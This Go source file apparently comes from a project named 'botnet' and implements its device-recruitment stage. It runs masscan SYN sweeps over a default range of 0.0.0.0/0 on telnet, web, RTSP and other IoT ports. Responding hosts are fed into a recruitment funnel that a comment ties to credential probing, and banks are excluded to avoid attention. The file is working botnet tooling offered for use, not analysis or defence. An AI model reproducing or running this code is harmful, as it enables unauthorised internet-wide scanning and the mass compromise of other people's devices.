package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/botnet/botnet/internal/discovery"
	"github.com/botnet/botnet/internal/recruit"
)

// Barrido SYN por cohortes (T-1701). El ritmo sale del suelo medido del
// codigo (discovery.SweepRate), no de un numero escrito aqui, y la cohorte
// parte el barrido en tandas de 60 s para que el enlace respire.
//
// masscan exige IP de origen y adaptador explicitos: se leen del entorno o
// de /etc/botnet-recruit/env, nunca del codigo (A1-14).

type recruitStore = recruit.Store

var recruitOpen = recruit.Open

// defaultCohortSeconds es la ventana de una cohorte.
const defaultCohortSeconds = 60

// envFile es donde el despliegue deja la IP y el adaptador.
const envFile = "/etc/botnet-recruit/env"

// cfgDespliegue lee RECRUIT_SOURCE_IP / RECRUIT_ADAPTER del entorno y, si no
// estan, del fichero de despliegue.
func cfgDespliegue(clave string) string {
	if v := os.Getenv(clave); v != "" {
		return v
	}
	f, err := os.Open(envFile)
	if err != nil {
		return ""
	}
	defer f.Close()
	b, err := io.ReadAll(io.LimitReader(f, 64*1024))
	if err != nil {
		return ""
	}
	for _, linea := range strings.Split(string(b), "\n") {
		linea = strings.TrimSpace(linea)
		if i := strings.Index(linea, "="); i > 0 && strings.TrimSpace(linea[:i]) == clave {
			return strings.Trim(strings.TrimSpace(linea[i+1:]), `"'`)
		}
	}
	return ""
}

// comandoMasscan arma el argv. `pps` es el ritmo de la ventana; `ips` el
// alcance; `ports` la lista. Con la interfaz en /32 (VPS de proveedor) hace
// falta el MAC del router: sin el, masscan no sabe a quien entregar el SYN.
func comandoMasscan(pps int, sourceIP, adapter, ips, ports, salida string) []string {
	argv := []string{
		"nice", "-n", "10",
		"masscan",
		"--source-ip", sourceIP,
		"--adapter", adapter,
	}
	if mac := cfgDespliegue("RECRUIT_ROUTER_MAC"); mac != "" {
		argv = append(argv, "--router-mac", mac)
	}
	argv = append(argv,
		"--rate", strconv.Itoa(pps),
		"--min-rate", strconv.Itoa(pps),
		"-p", ports,
	)
	// Escribir a fichero, no a stdout: masscan 1.3.2 no suelta el JSON si la
	// salida es un pipe.
	if salida != "" {
		argv = append(argv, "-oJ", salida)
	} else {
		argv = append(argv, "--output-format", "json")
	}
	return append(argv, ips)
}

// cohorte parte un total de SYN en tandas de `pps*segundos`. Devuelve el
// tamano de cohorte y cuantas hacen falta.
func cohorte(total, pps, segundos int) (int, int) {
	if segundos <= 0 {
		segundos = defaultCohortSeconds
	}
	porCohorte := pps * segundos
	if porCohorte <= 0 {
		porCohorte = 90000
	}
	n := int(math.Ceil(float64(total) / float64(porCohorte)))
	if n < 1 {
		n = 1
	}
	return porCohorte, n
}

// ejecutarSweep es el modo de barrido: con `--sweep-json` reproduce lo que
// masscan habria devuelto, sin red.
func ejecutarSweep(ctx context.Context, rutaJSON string, limit int, dryRun bool, emitSQL bool, segundos int) error {
	c, err := cargaConfig()
	if err != nil {
		return err
	}
	pps := discovery.SweepRate(runtime.NumCPU())
	if v := os.Getenv("RECRUIT_PPS_FIXED"); v != "" {
		if n, err := strconv.Atoi(v); n > 0 && err == nil {
			pps = n
		}
	}
	total := 325100 // /24 x 5 puertos: el alcance del runbook
	tamCohorte, nCohortes := cohorte(total, pps, segundos)
	argv := comandoMasscan(pps, cfgDespliegue("RECRUIT_SOURCE_IP"), cfgDespliegue("RECRUIT_ADAPTER"), c.Alcance, c.Puertos, "")

	if dryRun {
		fmt.Printf("masscan: %s\n", strings.Join(argv, " "))
		fmt.Printf("cohort_syn=%d cohort_seconds=%d cohorts=%d\n", tamCohorte, segundos, nCohortes)
		fmt.Printf("ritmo min-rate=%d pps=%d source_ip=%s adapter=%s\n", pps, pps, cfgDespliegue("RECRUIT_SOURCE_IP"), cfgDespliegue("RECRUIT_ADAPTER"))
		for i := 1; i <= nCohortes; i++ {
			fmt.Printf("cohort_id=%d\n", i)
		}
		return nil
	}
	if rutaJSON == "" {
		return fmt.Errorf("sweep sin red: pasa --sweep-json con la salida de masscan")
	}
	f, err := os.Open(rutaJSON)
	if err != nil {
		return err
	}
	defer f.Close()
	// El fixture puede marcar un candidato sin respuesta: masscan solo
	// escribe los que contestaron, asi que `no_answer` viaja como clave
	// propia y muere tipado en vez de quedarse colgado.
	sinRespuesta := map[string]bool{}
	if b, err := os.ReadFile(rutaJSON); err == nil {
		for _, linea := range strings.Split(string(b), "\n") {
			var m struct {
				IP       string `json:"ip"`
				Port     int    `json:"port"`
				NoAnswer bool   `json:"no_answer"`
			}
			if json.Unmarshal([]byte(linea), &m) == nil && m.IP != "" && m.NoAnswer {
				sinRespuesta[m.IP] = true
			}
		}
	}
	if _, err := f.Seek(0, 0); err != nil {
		return err
	}
	cands, err := discovery.ParseMasscanNDJSON(f)
	if err != nil {
		return err
	}
	if limit > 0 && len(cands) > limit {
		cands = cands[:limit]
	}
	st, err := abreStore()
	if err != nil {
		return err
	}
	defer st.Close()
	if err := ingerirCandidatos(ctx, st, cands, limit, sinRespuesta, emitSQL); err != nil {
		return err
	}
	if emitSQL {
		return nil
	}
	fmt.Printf("sweep: candidatos=%d cohorts=%d pps=%d\n", len(cands), nCohortes, pps)
	return nil
}

// ejecutarSweepLive barre de verdad: compra presupuesto en la ventana abierta,
// lanza masscan con el ritmo concedido y mete lo hallado por el mismo camino
// que el fixture. Sin el Grant el ratio efectivo se queda en cero y el
// planificador solo sabe bajar de clase (T-2002 AC3).
func ejecutarSweepLive(ctx context.Context, limit, segundos int) error {
	c, err := cargaConfig()
	if err != nil {
		return err
	}
	st, err := abreStore()
	if err != nil {
		return err
	}
	defer st.Close()
	if segundos <= 0 {
		segundos = defaultCohortSeconds
	}
	pps := discovery.SweepRate(runtime.NumCPU())
	if v := os.Getenv("RECRUIT_PPS_FIXED"); v != "" {
		if n, err := strconv.Atoi(v); n > 0 && err == nil {
			pps = n
		}
	}
	// Tope de SYN por /24 destino (A2-10): un bloque con muchas bocas no se
	// lleva el presupuesto de los demas. Falla cerrado: si el barrido no cabe
	// en el tope, hay que acortar puertos o bajar de prefijo.
	tope := 4000
	if v := cfgDespliegue("RECRUIT_BUDGET_PER_CIDR"); v != "" {
		if n, err := strconv.Atoi(v); n > 0 && err == nil {
			tope = n
		}
	}
	bocas := len(strings.Split(c.Puertos, ","))
	if por24 := 256 * bocas; por24 > tope {
		return fmt.Errorf("tope por /24: %d SYN en cada /24 supera el tope %d (acorta puertos o baja de prefijo)", por24, tope)
	}
	pedido := pps * segundos
	concedido, err := st.Grant(ctx, pedido)
	if err != nil {
		return fmt.Errorf("presupuesto: %w", err)
	}
	if concedido <= 0 {
		return fmt.Errorf("presupuesto: ventana sin saldo (pedido=%d)", pedido)
	}
	ritmo := concedido / segundos
	if ritmo < 1 {
		ritmo = 1
	}
	tmp, err := os.CreateTemp("", "masscan-*.json")
	if err != nil {
		return err
	}
	salida := tmp.Name()
	tmp.Close()
	defer os.Remove(salida)
	argv := comandoMasscan(ritmo, cfgDespliegue("RECRUIT_SOURCE_IP"), cfgDespliegue("RECRUIT_ADAPTER"), c.Alcance, c.Puertos, salida)
	cmd := exec.CommandContext(ctx, argv[0], argv[1:]...)
	var errb strings.Builder
	cmd.Stderr = &errb
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("masscan: %w: %s", err, strings.TrimSpace(errb.String()))
	}
	out, err := os.ReadFile(salida)
	if err != nil {
		return fmt.Errorf("masscan: leer salida: %w", err)
	}
	cands, err := normCandidatos(out)
	if err != nil {
		return err
	}
	if err := ingerirCandidatos(ctx, st, cands, limit, nil, false); err != nil {
		return err
	}
	fmt.Printf("sweep_live: candidatos=%d concedido=%d ritmo=%d pps segundos=%d\n",
		len(cands), concedido, ritmo, segundos)
	return nil
}

// normCandidatos acepta las dos formas en que masscan escribe hallazgos: la
// lista JSON con corchetes (la de siempre, `--output-format json`) y el
// NDJSON linea a linea. El parser del embudo solo entiende NDJSON.
func normCandidatos(out []byte) ([]discovery.Candidate, error) {
	body := bytes.TrimSpace(out)
	if len(body) > 0 && body[0] == '[' {
		var arr []json.RawMessage
		if err := json.Unmarshal(body, &arr); err != nil {
			return nil, fmt.Errorf("masscan json: %w", err)
		}
		var buf bytes.Buffer
		for _, r := range arr {
			buf.Write(r)
			buf.WriteByte('\n')
		}
		body = buf.Bytes()
	}
	return discovery.ParseMasscanNDJSON(bytes.NewReader(body))
}

// ingerirCandidatos es el unico camino de entrada al embudo: fixture y red
// comparten exclusion al nacer y estado inicial.
func ingerirCandidatos(ctx context.Context, st *recruit.Store, cands []discovery.Candidate,
	limit int, sinRespuesta map[string]bool, emitSQL bool) error {
	if limit > 0 && len(cands) > limit {
		cands = cands[:limit]
	}
	for _, cand := range cands {
		if emitSQL {
			fmt.Printf("INSERT INTO recruit_candidates (ip,port,source,state) VALUES ('%s',%d,'masscan','eligible') ON CONFLICT (ip,port) DO NOTHING;\n", cand.IP, cand.Port)
			continue
		}
		// Exclusion al nacer: un banco no gasta ni un SYN de credencial.
		if motivo, err := st.Coincide(ctx, cand.IP, ""); err == nil && motivo != "" {
			if id, err := st.CandidatoPorIP(ctx, cand.IP, cand.Port); err == nil {
				if err := st.Excluir(ctx, id, motivo, "probe"); err != nil {
					return err
				}
			}
			continue
		}
		estado := "bannered"
		if sinRespuesta[cand.IP] {
			estado = "sweeping"
		}
		if err := st.UpsertCandidato(ctx, cand.IP, cand.Port, "masscan", estado); err != nil {
			return err
		}
		if sinRespuesta[cand.IP] {
			if err := st.MarcarSinRespuesta(ctx, cand.IP, cand.Port); err != nil {
				return err
			}
		}
	}
	return nil
}

// cargaConfig devuelve el alcance y los puertos del entorno.
type configSweep struct{ Alcance, Puertos string }

func cargaConfig() (configSweep, error) {
	alcance := os.Getenv("RECRUIT_RANGE")
	puestos := os.Getenv("RECRUIT_PORTS")
	if alcance == "" {
		alcance = "0.0.0.0/0"
	}
	if puestos == "" {
		puestos = "23,80,8080,554,32210"
	}
	return configSweep{Alcance: alcance, Puertos: puestos}, nil
}

// abreStore abre el Store del paquete recruit con pool corto.
func abreStore() (*recruitStore, error) {
	return recruitOpen(os.Getenv("DATABASE_URL"), 2)
}
